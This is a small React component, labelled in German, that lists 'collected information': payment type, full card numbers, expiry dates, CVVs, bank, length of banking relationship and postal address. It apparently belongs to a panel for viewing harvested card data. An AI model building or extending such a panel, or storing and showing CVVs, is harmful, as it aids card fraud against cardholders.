// payInformations.js

import React from "react";
import "./payInformations.css";

const PayInformations = ({ collectedInformation }) => {
  return (
    <div>
      <h2>Gesammelte Informationen</h2>
      <ul>
        {collectedInformation.map((info, index) => (
          <li key={index}>
            <strong>Zahlungstyp:</strong> {info.paymentType} <br />
            <strong>Kartennummer:</strong> {info.cardNumber} <br />
            <strong>Ablaufdatum:</strong> {info.expiryMonth}/{info.expiryYear} <br />
            <strong>CVV:</strong> {info.cvv} <br />
            <strong>Bank:</strong> {info.bank} <br />
            <strong>Seit wann bei der Bank:</strong> {info.bankSince} <br />
            <strong>Strasse / Postfach:</strong> {info.street} <br />
            <strong>Postleitzahl:</strong> {info.zipCode} <br />
            <strong>Ort:</strong> {info.city} <br />
          </li>
        ))}
      </ul>
    </div>
  );
};

export default PayInformations;
